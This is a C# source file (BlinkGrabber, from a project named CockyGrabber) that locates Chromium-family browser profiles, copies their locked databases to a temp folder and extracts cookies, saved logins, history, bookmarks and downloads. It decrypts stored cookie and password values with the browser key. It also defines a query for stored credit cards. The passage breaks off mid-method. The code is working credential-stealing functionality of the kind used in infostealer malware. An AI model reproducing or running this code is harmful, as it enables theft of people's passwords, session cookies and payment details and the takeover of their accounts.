using CockyGrabber.Utility;
using CockyGrabber.Utility.Cryptography;
using CockyGrabber.Utility.Cryptography.BouncyCastle;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web.Script.Serialization;

namespace CockyGrabber.Grabbers
{
    public class BlinkGrabber
    {
        private const string CookieQuery = "SELECT creation_utc,top_frame_site_key,host_key,name,value,encrypted_value,path,expires_utc,is_secure,is_httponly,last_access_utc,has_expires,is_persistent,priority,samesite,source_scheme,source_port,is_same_party FROM cookies";
        private const string LoginQuery = "SELECT origin_url,action_url,username_element,username_value,password_element,password_value,submit_element,signon_realm,date_created,blacklisted_by_user,scheme,password_type,times_used,form_data,display_name,icon_url,federation_url,skip_zero_click,generation_upload_status,possible_username_pairs,id,date_last_used,moving_blocked_for,date_password_modified FROM logins";
        private const string HistoryQuery = "SELECT id,url,title,visit_count,typed_count,last_visit_time,hidden FROM urls";
        private const string DownloadQuery = "SELECT id,guid,current_path,target_path,start_time,received_bytes,total_bytes,state,danger_type,interrupt_reason,hash,end_time,opened,last_access_time,transient,referrer,site_url,tab_url,tab_referrer_url,http_method,by_ext_id,by_ext_name,etag,last_modified,mime_type,original_mime_type,embedder_download_data FROM downloads";
        private const string FormDataQuery = "SELECT name,value,value_lower,date_created,date_last_used,count FROM autofill";
        private const string CreditCardQuery = "SELECT guid,name_on_card,expiration_month,expiration_year,card_number_encrypted,date_modified,origin,use_count,use_date,billing_address_id,nickname FROM credit_cards";
        public virtual string DataRootPath { get; set; }
        public virtual string CookiePath { get; set; }
        public virtual string LocalStatePath { get; set; }
        public virtual string LoginDataPath { get; set; }
        public virtual string HistoryPath { get; set; }
        public virtual string BookmarkPath { get; set; }
        public virtual string WebDataPath { get; set; }

        private readonly JavaScriptSerializer JSON_Serializer = new JavaScriptSerializer();
        private readonly IEnumerable<string> _profiles = new string[] { "" };
        public string[] Profiles
        {
            get
            {
                string[] profiles = _profiles.ToArray();
                if (profiles[0] == "") // If there are no profiles
                    return new string[] { };
                return profiles;
            }
        }
        public BlinkGrabber()
        {
            JSON_Serializer.RegisterConverters(new[] { new DynamicJsonConverter() }); // Register DynamicJsonConverter for dynamic JSON (De)Serialisation

            // Get all profile paths:

            // (This checks if the default profile exists because if it doesn't, then the browser probably
            // doesn't support multiple profiles. Opera browsers, for example, don't carry the option to
            // create different browser profiles, so they store all of their information in the root folder.
            // If "Default" doesn't exist, then the IEnumerable "_profiles" will only bear one empty string
            // so that the root folder path and the path of the related browser information file can concatenate
            // into one profile-less string.)
            if (Directory.Exists(DataRootPath + "\\Default")) // If the default profile exists:
            {
                _profiles = Directory.GetDirectories(DataRootPath).Where(dir => dir.Substring(dir.LastIndexOf('\\') + 1).StartsWith("Profile")); // Reassign _profiles a list of profile directories
                _profiles = _profiles.Append(DataRootPath + "\\Default"); // Append the default profile located in the "Default" directory to the list
            }
        }

        #region IO Functions
        /// <summary>
        /// Copies a file to a temporary location in %temp%.
        /// </summary>
        /// <param name="path">Path to the file that should be copied to a temporary location.</param>
        /// <returns>The path to the temp file.</returns>
        private string CopyToTempFile(string path)
        {
            string tempFilePath = GetTempFilePath();
            if (File.Exists(tempFilePath)) // If File already exists:
                return CopyToTempFile(path); // Repeat previous steps
            File.Copy(path, tempFilePath);
            return tempFilePath;
        }

        /// <summary>
        /// Create an imaginary path to a temporary file in %temp%.
        /// </summary>
        /// <returns>The path to the temp file.</returns>
        private string GetTempFilePath() => Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString()); // This is better than Path.GetTempFileName() because GetTempFileName is most of the time inaccurate

        /// <summary>
        /// Returns a value depending on if the database with the stored cookies was found on a specific browser profile.
        /// </summary>
        /// <param name="profile">The path to the browser profile directory.</param>
        /// <returns>True if the cookies exist.</returns>
        public bool CookiesExist(string profile) => File.Exists(profile + CookiePath);
        /// <summary>
        /// Returns a value depending on if any databases with stored cookies were found (on any profile; given that profiles are supported on the browser).
        /// </summary>
        /// <returns>True if the cookies exist.</returns>
        public bool AnyCookiesExist()
        {
            foreach (string profile in _profiles)
                if (CookiesExist(profile)) return true;
            return false;
        }

        /// <summary>
        /// Returns a value depending on if the database with the stored logins was found on a specific browser profile.
        /// </summary>
        /// <param name="profile">The path to the browser profile directory.</param>
        /// <returns>True if the logins exist.</returns>
        public bool LoginsExist(string profile) => File.Exists(profile + LoginDataPath);
        /// <summary>
        /// Returns a value depending on if any databases with stored logins were found (on any profile; given that profiles are supported on the browser).
        /// </summary>
        /// <returns>True if the logins exist.</returns>
        public bool AnyLoginsExist()
        {
            foreach (string profile in _profiles)
                if (LoginsExist(profile)) return true;
            return false;
        }

        /// <summary>
        /// Returns a value depending on if the database with the stored browser history was found on a specific browser profile.
        /// </summary>
        /// <param name="profile">The path to the browser profile directory.</param>
        /// <returns>True if the history exist.</returns>
        public bool HistoryExists(string profile) => File.Exists(profile + HistoryPath);
        /// <summary>
        /// Returns a value depending on if any databases with stored browser history were found (on any profile; given that profiles are supported on the browser).
        /// </summary>
        /// <returns>True if the history exist.</returns>
        public bool AnyHistoryExists()
        {
            foreach (string profile in _profiles)
                if (HistoryExists(profile)) return true;
            return false;
        }

        /// <summary>
        /// Returns a value depending on if the database with the stored browser bookmarks was found on a specific browser profile.
        /// </summary>
        /// <param name="profile">The path to the browser profile directory.</param>
        /// <returns>True if the bookmarks exist.</returns>
        public bool BookmarksExist(string profile) => File.Exists(profile + BookmarkPath);
        /// <summary>
        /// Returns a value depending on if any databases with stored browser bookmarks were found (on any profile; given that profiles are supported on the browser).
        /// </summary>
        /// <returns>True if the bookmarks exist.</returns>
        public bool AnyBookmarksExist()
        {
            foreach (string profile in _profiles)
                if (BookmarksExist(profile)) return true;
            return false;
        }

        /// <summary>
        /// Returns a value depending on if the database with the stored downloads was found on a specific browser profile.
        /// </summary>
        /// <param name="profile">The path to the browser profile directory.</param>
        /// <returns>True if the downloads exist.</returns>
        public bool DownloadsExist(string profile) => File.Exists(profile + HistoryPath);
        /// <summary>
        /// Returns a value depending on if any databases with stored downloads were found (on any profile; given that profiles are supported on the browser).
        /// </summary>
        /// <returns>True if the downloads exist.</returns>
        public bool AnyDownloadsExist()
        {
            foreach (string profile in _profiles)
                if (DownloadsExist(profile)) return true;
            return false;
        }

        /// <summary>
        /// Returns a value depending on if the database with the stored browser web data was found on a specific browser profile.
        /// </summary>
        /// <param name="profile">The path to the browser profile directory.</param>
        /// <returns>True if the web data database exist.</returns>
        public bool WebDataExists(string profile) => File.Exists(profile + WebDataPath);
        /// <summary>
        /// Returns a value depending on if any databases with stored browser web data were found (on any profile; given that profiles are supported on the browser).
        /// </summary>
        /// <returns>True if the web data database exist.</returns>
        public bool AnyWebDataExists()
        {
            foreach (string profile in _profiles)
                if (WebDataExists(profile)) return true;
            return false;
        }

        /// <summary>
        /// Returns a value depending on if the file that stores the key for the value decryption was found.
        /// </summary>
        /// <returns>True if the file with the key exist.</returns>
        public bool KeyExists() => File.Exists(LocalStatePath);

        /// <summary>
        /// Returns a value depending on if all files relevant for the gathering of data that store any type of browser information exist.
        /// </summary>
        /// <returns>True if the file with the key exist.</returns>
        public bool EverythingExists() => KeyExists() && AnyCookiesExist() && AnyLoginsExist() && AnyHistoryExists() && AnyBookmarksExist() && AnyDownloadsExist() && AnyWebDataExists();
        #endregion

        #region GetCookies()
        public IEnumerable<Blink.Cookie> GetCookiesBy(Blink.Cookie.Header by, object value) => GetCookiesBy(by, value, GetKey());
        public IEnumerable<Blink.Cookie> GetCookiesBy(Blink.Cookie.Header by, object value, byte[] key) => GetCookiesBy(by, value, new KeyParameter(key));
        public IEnumerable<Blink.Cookie> GetCookiesBy(Blink.Cookie.Header by, object value, KeyParameter key)
        {
            List<Blink.Cookie> cookies = new List<Blink.Cookie>();
            if (value == null) throw new ArgumentNullException("value"); // Throw a ArgumentNullException if value was not defined
            if (!AnyCookiesExist()) throw new GrabberException(GrabberError.CookiesNotFound, $"No cookie databases were found!"); // Throw an Exception if no cookie DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!CookiesExist(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + CookiePath);

                using (var conn = new SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"{CookieQuery} WHERE {by} = '{value}'";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            // Store retrieved information:
                            cookies.Add(new Blink.Cookie()
                            {
                                CreationUTC = Time.FromWebkitTimeMicroseconds(reader.GetInt64(0)),
                                TopFrameSiteKey = reader.GetString(1),
                                HostKey = reader.GetString(2),
                                Name = reader.GetString(3),
                                Value = reader.GetString(4),
                                EncryptedValue = (byte[])reader.GetValue(5),
                                DecryptedValue = BlinkDecryptor.DecryptValue((byte[])reader[5], key),
                                Path = reader.GetString(6),
                                ExpiresUTC = Time.FromWebkitTimeMicroseconds(reader.GetInt64(7)),
                                IsSecure = reader.GetBoolean(8),
                                IsHttpOnly = reader.GetBoolean(9),
                                LastAccessUTC = Time.FromWebkitTimeMicroseconds(reader.GetInt64(10)),
                                HasExpires = reader.GetBoolean(11),
                                IsPersistent = reader.GetBoolean(12),
                                Priority = reader.GetInt16(13),
                                Samesite = (Blink.Cookie.SameSiteType)reader.GetInt16(14),
                                SourceScheme = reader.GetInt16(15),
                                SourcePort = reader.GetInt32(16),
                                IsSameParty = reader.GetBoolean(17),
                            });
                        }
                    }
                    conn.Close();
                }

                File.Delete(tempFile);
            });

            return cookies;
        }

        public IEnumerable<Blink.Cookie> GetCookies() => GetCookies(GetKey());
        public IEnumerable<Blink.Cookie> GetCookies(byte[] key) => GetCookies(new KeyParameter(key));
        public IEnumerable<Blink.Cookie> GetCookies(KeyParameter key)
        {
            List<Blink.Cookie> cookies = new List<Blink.Cookie>();
            if (!AnyCookiesExist()) throw new GrabberException(GrabberError.CookiesNotFound, $"No cookie databases were found!"); // Throw an Exception if no cookie DBs were found

            // Foreach profile:
            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!CookiesExist(profile)) return;

                // Copy the database to a temporary location in case it could be already in use:
                string tempFile = CopyToTempFile(profile + CookiePath);

                using (var conn = new SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = CookieQuery;

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            // Store retrieved information:
                            cookies.Add(new Blink.Cookie()
                            {
                                CreationUTC = Time.FromWebkitTimeMicroseconds(reader.GetInt64(0)),
                                TopFrameSiteKey = reader.GetString(1),
                                HostKey = reader.GetString(2),
                                Name = reader.GetString(3),
                                Value = reader.GetString(4),
                                EncryptedValue = (byte[])reader.GetValue(5),
                                DecryptedValue = BlinkDecryptor.DecryptValue((byte[])reader[5], key),
                                Path = reader.GetString(6),
                                ExpiresUTC = Time.FromWebkitTimeMicroseconds(reader.GetInt64(7)),
                                IsSecure = reader.GetBoolean(8),
                                IsHttpOnly = reader.GetBoolean(9),
                                LastAccessUTC = Time.FromWebkitTimeMicroseconds(reader.GetInt64(10)),
                                HasExpires = reader.GetBoolean(11),
                                IsPersistent = reader.GetBoolean(12),
                                Priority = reader.GetInt16(13),
                                Samesite = (Blink.Cookie.SameSiteType)reader.GetInt16(14), // Todo: check if shit's right
                                SourceScheme = reader.GetInt16(15),
                                SourcePort = reader.GetInt32(16),
                                IsSameParty = reader.GetBoolean(17),
                            });
                        }
                    }
                    conn.Close();
                }
                File.Delete(tempFile);
            });

            return cookies;
        }
        #endregion

        #region GetLogins()
        public IEnumerable<Blink.Login> GetLoginsBy(Blink.Login.Header by, object value) => GetLoginsBy(by, value, GetKey());
        public IEnumerable<Blink.Login> GetLoginsBy(Blink.Login.Header by, object value, byte[] key) => GetLoginsBy(by, value, new KeyParameter(key));
        public IEnumerable<Blink.Login> GetLoginsBy(Blink.Login.Header by, object value, KeyParameter key)
        {
            List<Blink.Login> password = new List<Blink.Login>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            if (!AnyLoginsExist()) throw new GrabberException(GrabberError.LoginsNotFound, $"No login databases were found!"); // Throw an Exception if no login DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!LoginsExist(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + LoginDataPath);

                using (var conn = new SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"{LoginQuery} WHERE {by} = '{value}'";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            // Store retrieved information:
                            password.Add(new Blink.Login()
                            {
                                OriginUrl = reader.GetString(0),
                                ActionUrl = reader.GetString(1),
                                UsernameElement = reader.GetString(2),
                                UsernameValue = reader.GetString(3),
                                PasswordElement = reader.GetString(4),
                                PasswordValue = (byte[])reader.GetValue(5),
                                DecryptedPasswordValue = BlinkDecryptor.DecryptValue((byte[])reader[5], key),
                                SubmitElement = reader.GetString(6),
                                SignonRealm = reader.GetString(7),
                                DateCreated = Time.FromWebkitTimeMicroseconds(reader.GetInt64(8)),
                                IsBlacklistedByUser = reader.GetBoolean(9),
                                Scheme = reader.GetInt32(10),
                                PasswordType = reader.GetInt32(11),
                                TimesUsed = reader.GetInt32(12),
                                FormData = BlinkDecryptor.DecryptValue((byte[])reader[13], key),
                                DisplayName = reader.GetString(14),
                                IconUrl = reader.GetString(15),
                                FederationUrl = reader.GetString(16),
                                SkipZeroClick = reader.GetInt32(17),
                                GenerationUploadStatus = reader.GetInt32(18),
                                PossibleUsernamePairs = BlinkDecryptor.DecryptValue((byte[])reader[19], key),
                                Id = reader.GetInt32(20),
                                DateLastUsed = Time.FromWebkitTimeMicroseconds(reader.GetInt64(21)),
                                MovingBlockedFor = BlinkDecryptor.DecryptValue((byte[])reader[22], key),
                                DatePasswordModified = Time.FromWebkitTimeMicroseconds(reader.GetInt64(23)),
                            });
                        }
                    }
                    conn.Close();
                }
                File.Delete(tempFile);
            });

            return password;
        }

        public IEnumerable<Blink.Login> GetLogins() => GetLogins(GetKey());
        public IEnumerable<Blink.Login> GetLogins(byte[] key) => GetLogins(new KeyParameter(key));
        public IEnumerable<Blink.Login> GetLogins(KeyParameter key)
        {
            List<Blink.Login> password = new List<Blink.Login>();
            if (!AnyLoginsExist()) throw new GrabberException(GrabberError.LoginsNotFound, $"No login databases were found!"); // Throw an Exception if no login DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!LoginsExist(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + LoginDataPath);

                using (var conn = new SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = LoginQuery;

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            password.Add(new Blink.Login()
                            {
                                // Store retrieved information:
                                OriginUrl = reader.GetString(0),
                                ActionUrl = reader.GetString(1),
                                UsernameElement = reader.GetString(2),
                                UsernameValue = reader.GetString(3),
                                PasswordElement = reader.GetString(4),
                                PasswordValue = (byte[])reader.GetValue(5),
                                DecryptedPasswordValue = BlinkDecryptor.DecryptValue((byte[])reader[5], key),
                                SubmitElement = reader.GetString(6),
                                SignonRealm = reader.GetString(7),
                                DateCreated = Time.FromWebkitTimeMicroseconds(reader.GetInt64(8)),
                                IsBlacklistedByUser = reader.GetBoolean(9),
                                Scheme = reader.GetInt32(10),
                                PasswordType = reader.GetInt32(11),
                                TimesUsed = reader.GetInt32(12),
                                FormData = BlinkDecryptor.DecryptValue((byte[])reader[13], key),
                                DisplayName = reader.GetString(14),
                                IconUrl = reader.GetString(15),
                                FederationUrl = reader.GetString(16),
                                SkipZeroClick = reader.GetInt32(17),
                                GenerationUploadStatus = reader.GetInt32(18),
                                PossibleUsernamePairs = BlinkDecryptor.DecryptValue((byte[])reader[19], key),
                                Id = reader.GetInt32(20),
                                DateLastUsed = Time.FromWebkitTimeMicroseconds(reader.GetInt64(21)),
                                MovingBlockedFor = BlinkDecryptor.DecryptValue((byte[])reader[22], key),
                                DatePasswordModified = Time.FromWebkitTimeMicroseconds(reader.GetInt64(23)),
                            });
                        }
                    }
                    conn.Close();
                }
                File.Delete(tempFile);
            });

            return password;
        }
        #endregion

        #region GetHistory()
        public IEnumerable<Blink.Site> GetHistoryBy(Blink.Site.Header by, object value)
        {
            List<Blink.Site> history = new List<Blink.Site>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            if (!AnyHistoryExists()) throw new GrabberException(GrabberError.HistoryNotFound, $"No history databases were found!"); // Throw an Exception if no history DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!HistoryExists(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + HistoryPath);

                using (var conn = new SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"{HistoryQuery} WHERE {by} = '{value}'";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            history.Add(new Blink.Site()
                            {
                                // Store retrieved information:
                                Id = reader.GetInt32(0),
                                Url = reader.GetString(1),
                                Title = reader.GetString(2),
                                VisitCount = reader.GetInt32(3),
                                TypedCount = reader.GetInt32(4),
                                LastVisitTime = Time.FromWebkitTimeMicroseconds(reader.GetInt64(5)),
                                IsHidden = reader.GetBoolean(6),
                            });
                        }
                    }
                    conn.Close();
                }
                File.Delete(tempFile);
            });

            return history;
        }

        public IEnumerable<Blink.Site> GetHistory()
        {
            List<Blink.Site> history = new List<Blink.Site>();
            if (!AnyHistoryExists()) throw new GrabberException(GrabberError.HistoryNotFound, $"No history databases were found!"); // Throw an Exception if no history DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!HistoryExists(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + HistoryPath);

                using (var conn = new SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = HistoryQuery;

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            history.Add(new Blink.Site()
                            {
                                // Store retrieved information:
                                Id = reader.GetInt32(0),
                                Url = reader.GetString(1),
                                Title = reader.GetString(2),
                                VisitCount = reader.GetInt32(3),
                                TypedCount = reader.GetInt32(4),
                                LastVisitTime = Time.FromWebkitTimeMicroseconds(reader.GetInt64(5)),
                                IsHidden = reader.GetBoolean(6),
                            });
                        }
                    }
                    conn.Close();
                }
                File.Delete(tempFile);
            });

            return history;
        }
        #endregion

        #region GetBookmarks()
        /// <summary>
        /// Gets all bookmarks and those in subfolders from a dynamic json object
        /// </summary>
        /// <param name="children">dynamic json object</param>
        /// <returns>A list of Blink Bookmarks</returns>
        private static List<Blink.Bookmark> GetBookmarkChildren(List<object> children)
        {
            List<Blink.Bookmark> _bookmarks = new List<Blink.Bookmark>();
            foreach (dynamic x in children)
            {
                if (x.type == "folder")
                {
                    _bookmarks.AddRange(GetBookmarkChildren(x.children)); // Recursive call
                }
                else
                {
                    _bookmarks.Add(new Blink.Bookmark()
                    {
                        DateAdded = Time.FromWebkitTimeMicroseconds(long.Parse(x.date_added)),
                        Guid = x.guid,
                        Id = int.Parse(x.id),
                        Name = x.name,
                        Type = x.type,
                        Url = x.url,
                    });
                }
            }
            return _bookmarks;
        }

        public IEnumerable<Blink.Bookmark> GetBookmarksBy(Blink.Bookmark.Header by, object value)
        {
            List<Blink.Bookmark> bookmarks = new List<Blink.Bookmark>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            if (!AnyBookmarksExist()) throw new GrabberException(GrabberError.BookmarksNotFound, $"No bookmark databases were found!"); // Throw an Exception if no bookmark DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!BookmarksExist(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + BookmarkPath);

                dynamic json = JSON_Serializer.Deserialize(File.ReadAllText(profile + BookmarkPath), typeof(object)); // TODO: Add other bookmarks not only bar

                if (json.roots.bookmark_bar.children != null)
                {
                    // Check if children (Array) is List<object>
                    // If children (Array) is empty it's an ArrayList and that can cause Problems:
                    if (json.roots.bookmark_bar.children is List<object>)
                    {
                        foreach (Blink.Bookmark b in GetBookmarkChildren(json.roots.bookmark_bar.children))
                        {
                            switch (by)
                            {
                                case Blink.Bookmark.Header.date_added:
                                    if (b.DateAdded == (DateTimeOffset)value)
                                        bookmarks.Add(b);
                                    break;
                                case Blink.Bookmark.Header.guid:
                                    if (b.Guid == (string)value)
                                        bookmarks.Add(b);
                                    break;
                                case Blink.Bookmark.Header.id:
                                    if (b.Id == (int)value)
                                        bookmarks.Add(b);
                                    break;
                                case Blink.Bookmark.Header.name:
                                    if (b.Name == (string)value)
                                        bookmarks.Add(b);
                                    break;
                                case Blink.Bookmark.Header.type:
                                    if (b.Type == (string)value)
                                        bookmarks.Add(b);
                                    break;
                                case Blink.Bookmark.Header.url:
                                    if (b.Url == (string)value)
                                        bookmarks.Add(b);
                                    break;
                            }
                        }
                    }
                }
                if (json.roots.other.children != null)
                {
                    // Check if children (Array) is List<object>
                    // If children (Array) is empty it's an ArrayList and that can cause Problems:
                    if (json.roots.other.children is List<object>)
                    {
                        foreach (Blink.Bookmark b in GetBookmarkChildren(json.roots.other.children))
                        {
                            switch (by)
                            {
                                case Blink.Bookmark.Header.date_added:
                                    if (b.DateAdded == (DateTimeOffset)value)
                                        bookmarks.Add(b);
                                    break;
                                case Blink.Bookmark.Header.guid:
                                    if (b.Guid == (string)value)
                                        bookmarks.Add(b);
                                    break;
                                case Blink.Bookmark.Header.id:
                                    if (b.Id == (int)value)
                                        bookmarks.Add(b);
                                    break;
                                case Blink.Bookmark.Header.name:
                                    if (b.Name == (string)value)
                                        bookmarks.Add(b);
                                    break;
                                case Blink.Bookmark.Header.type:
                                    if (b.Type == (string)value)
                                        bookmarks.Add(b);
                                    break;
                                case Blink.Bookmark.Header.url:
                                    if (b.Url == (string)value)
                                        bookmarks.Add(b);
                                    break;
                            }
                        }
                    }
                }

                File.Delete(tempFile);
            });

            return bookmarks;
        }

        public IEnumerable<Blink.Bookmark> GetBookmarks()
        {
            List<Blink.Bookmark> bookmarks = new List<Blink.Bookmark>();
            if (!AnyBookmarksExist()) throw new GrabberException(GrabberError.BookmarksNotFound, $"No bookmark databases were found!"); // Throw an Exception if no bookmark DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!BookmarksExist(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + BookmarkPath);

                dynamic json = JSON_Serializer.Deserialize(File.ReadAllText(profile + BookmarkPath), typeof(object)); // TODO: Add other bookmarks not only bar

                if (json.roots.bookmark_bar.children != null)
                {
                    // Check if children (Array) is List<object>
                    // If children (Array) is empty it's an ArrayList and that can cause Problems:
                    if (json.roots.bookmark_bar.children is List<object>)
                    {
                        List<Blink.Bookmark> bs = GetBookmarkChildren(json.roots.bookmark_bar.children);
                        if (bs.Count > 0)
                            bookmarks.AddRange(bs);
                    }
                }
                if (json.roots.other.children != null)
                {
                    // Check if children (Array) is List<object>
                    // If children (Array) is empty it's an ArrayList and that can cause Problems:
                    if (json.roots.other.children is List<object>)
                    {
                        List<Blink.Bookmark> bs = GetBookmarkChildren(json.roots.other.children);
                        if (bs.Count > 0)
                            bookmarks.AddRange(bs);
                    }
                }

                File.Delete(tempFile);
            });

            return bookmarks;
        }
        #endregion

        #region GetDownloads()
        public IEnumerable<Blink.Download> GetDownloadsBy(Blink.Download.Header by, object value)
        {
            List<Blink.Download> downloads = new List<Blink.Download>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            if (!AnyDownloadsExist()) throw new GrabberException(GrabberError.DownloadsNotFound, $"No download databases were found!"); // Throw an Exception if no download DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!DownloadsExist(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + HistoryPath);

                using (var conn = new SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    conn.Open();
                    bool eddExists = conn.ColumnExists("downloads", "embedder_download_data"); // Check if the column with the name 'embedder_download_data' exists

                    cmd.CommandText = eddExists ? $"{DownloadQuery} WHERE {by} = '{value}'" : $"{DownloadQuery.Replace(",embedder_download_data", null)} WHERE {by} = '{value}'";

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            using (var _cmd = conn.CreateCommand())
                            {
                                int id = reader.GetInt32(0); // Get id
                                _cmd.CommandText = $"SELECT url FROM downloads_url_chains WHERE id = '{id}'";

                                string tP = reader[3].Equals(DBNull.Value) ? null : reader.GetString(3); // Get target path

                                // Get LastModifed:
                                DateTimeOffset lM; // last_modified
                                {
                                    string tS = reader.GetString(23); // Get last_modified time stamp

                                    if (tS == string.Empty)
                                    {
                                        lM = DateTimeOffset.MinValue;
                                    }
                                    else
                                    {
                                        int month;
                                        // Switch month:
                                        switch (tS.Substring(8).Remove(3))
                                        {
                                            case "Jan":
                                                month = 1;
                                                break;
                                            case "Feb":
                                                month = 2;
                                                break;
                                            case "Mar":
                                                month = 3;
                                                break;
                                            case "Apr":
                                                month = 4;
                                                break;
                                            case "May":
                                                month = 5;
                                                break;
                                            default:
                                            case "Jun":
                                                month = 6;
                                                break;
                                            case "Jul":
                                                month = 7;
                                                break;
                                            case "Aug":
                                                month = 8;
                                                break;
                                            case "Sept":
                                                month = 9;
                                                break;
                                            case "Oct":
                                                month = 10;
                                                break;
                                            case "Nov":
                                                month = 11;
                                                break;
                                            case "Dec":
                                                month = 12;
                                                break;
                                        }

                                        lM = new DateTimeOffset(
                                            int.Parse(tS.Substring(12).Remove(4)), // year
                                            month, // month
                                            int.Parse(tS.Substring(5).Remove(2)), // day
                                            int.Parse(tS.Substring(17).Remove(2)), // hour
                                            int.Parse(tS.Substring(20).Remove(2)), // minute
                                            int.Parse(tS.Substring(23).Remove(2)), // second
                                            new TimeSpan(2, 0, 0)); // GMT (UTC+2) (idfk if it's **ALWAYS** GMT)
                                    }
                                }

                                downloads.Add(new Blink.Download()
                                {
                                    // Store retrieved information:
                                    Id = id,
                                    Guid = reader.GetString(1),
                                    CurrentPath = reader.GetString(2),
                                    TargetPath = tP,
                                    StartTime = Time.FromWebkitTimeMicroseconds(reader.GetInt64(4)),
                                    ReceivedBytes = reader.GetInt32(5),
                                    TotalBytes = reader.GetInt32(6),
                                    State = reader.GetInt16(7),
                                    DangerType = reader.GetInt16(8),
                                    InterruptReason = reader.GetInt16(9),
                                    Hash = (byte[])reader[10],
                                    EndTime = Time.FromWebkitTimeMicroseconds(reader.GetInt64(11)),
                                    IsOpened = reader.GetBoolean(12),
                                    LastAccessTime = Time.FromWebkitTimeMicroseconds(reader.GetInt64(13)),
                                    Transient = reader.GetInt32(14),
                                    Referrer = reader.GetString(15),
                                    SiteUrl = reader.GetString(16),
                                    TabUrl = reader.GetString(17),
                                    TabReferrerUrl = reader.GetString(18),
                                    HttpMethod = reader.GetString(19),
                                    ByExtId = reader.GetString(20),
                                    ByExtName = reader.GetString(21),
                                    Etag = reader.GetString(22),
                                    LastModified = lM,
                                    MimeType = reader.GetString(24),
                                    OriginalMimeType = reader.GetString(25),
                                    EmbedderDownloadData = eddExists ? reader.GetString(26) : string.Empty,

                                    Url = (string)_cmd.ExecuteScalar(),
                                    Filename = tP.Substring(tP.LastIndexOf('/') + 1), // Get the substring of the last '/'. Example: C:/Users/User/Downloads/File.zip = File.zip
                                });
                            }
                        }
                    }
                    conn.Close();
                }
                File.Delete(tempFile);
            });

            return downloads;
        }

        public IEnumerable<Blink.Download> GetDownloads()
        {
            List<Blink.Download> downloads = new List<Blink.Download>();
            if (!AnyDownloadsExist()) throw new GrabberException(GrabberError.DownloadsNotFound, $"No download databases were found!"); // Throw an Exception if no download DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!DownloadsExist(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + HistoryPath);

                using (var conn = new SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    conn.Open();
                    bool eddExists = conn.ColumnExists("downloads", "embedder_download_data"); // Check if the column with the name 'embedder_download_data' exists

                    cmd.CommandText = eddExists ? DownloadQuery : DownloadQuery.Replace(",embedder_download_data", null);

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            using (var _cmd = conn.CreateCommand())
                            {
                                int id = reader.GetInt32(0); // Get id
                                _cmd.CommandText = $"SELECT url FROM downloads_url_chains WHERE id = '{id}'";

                                string tP = reader[3].Equals(DBNull.Value) ? null : reader.GetString(3); // Get target path

                                // Get LastModifed:
                                DateTimeOffset lM; // last_modified
                                {
                                    string tS = reader.GetString(23); // Get last_modified time stamp

                                    if (tS == string.Empty)
                                    {
                                        lM = DateTimeOffset.MinValue;
                                    }
                                    else
                                    {
                                        int month;
                                        // Switch month:
                                        switch (tS.Substring(8).Remove(3))
                                        {
                                            case "Jan":
                                                month = 1;
                                                break;
                                            case "Feb":
                                                month = 2;
                                                break;
                                            case "Mar":
                                                month = 3;
